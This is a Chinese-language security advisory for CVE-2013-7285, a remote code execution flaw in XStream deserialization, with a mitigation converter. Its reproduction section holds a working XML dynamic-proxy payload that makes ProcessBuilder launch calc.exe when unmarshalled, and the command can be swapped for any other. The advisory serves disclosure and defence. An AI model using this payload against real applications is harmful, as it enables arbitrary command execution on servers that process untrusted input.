# CVE-2013-7285

## 脆弱性

CVE-2013-7285: XStream 可以用于远程代码执行。

## 影响版本

在 1.4.6 之前的所有版本都将受到影响，但存在一个解决方案。

如果安全框架没有被初始化，版本 1.4.10 将受到影响。

## 描述

在解组时处理的流包含类型信息，以重新创建以前写入的对象。因此，XStream 根据这些类型信息创建新的实例。攻击者可以操作已处理的输入流并替换或注入对象，这些对象可以执行任意 shell 命令。

## 重现步骤

创建一个简单的接口，例如命名 Contact 和一个实现类。使用 XStream 将这样的对象编组为 XML。用以下代码片段替换 XML，并再次用 XStream 反编组它:

```xml
<contact class='dynamic-proxy'>
  <interface>org.company.model.Contact</interface>
  <handler class='java.beans.EventHandler'>
    <target class='java.lang.ProcessBuilder'>
      <command>
        <string>calc.exe</string>
      </command>
    </target>
    <action>start</action>
  </handler>
</contact>
```

```java
XStream xstream = new XStream();
Contact contact = (Contact)xstream.fromXML(xml);
```

然后，只要代码调用 Contact 实例上的任何方法，就会执行有效负载，例如 Contact . getfirstname()。

注意，本例使用 XML，但攻击可以针对任何支持的格式执行。例如 JSON。

## 影响

该漏洞可能允许远程攻击者仅通过操纵已处理的输入流来运行任意 shell 命令。

## 解决方案

用户可以为动态代理、`java.beans.EventHandler` 类型或 `java.lang.ProcessBuilder` 类型注册自己的转换器，这也可以防止这种特殊情况下的攻击:

```java
xstream.registerConverter(new Converter() {
  public boolean canConvert(Class type) {
    return type != null && (type == java.beans.EventHandler || type == java.lang.ProcessBuilder || Proxy.isProxy(type));
  }

  public Object unmarshal(HierarchicalStreamReader reader, UnmarshallingContext context) {
    throw new ConversionException("Unsupported type due to security reasons.");
  }

  public void marshal(Object source, HierarchicalStreamWriter writer, MarshallingContext context) {
    throw new ConversionException("Unsupported type due to security reasons.");
  }
}, XStream.PRIORITY_LOW);
```
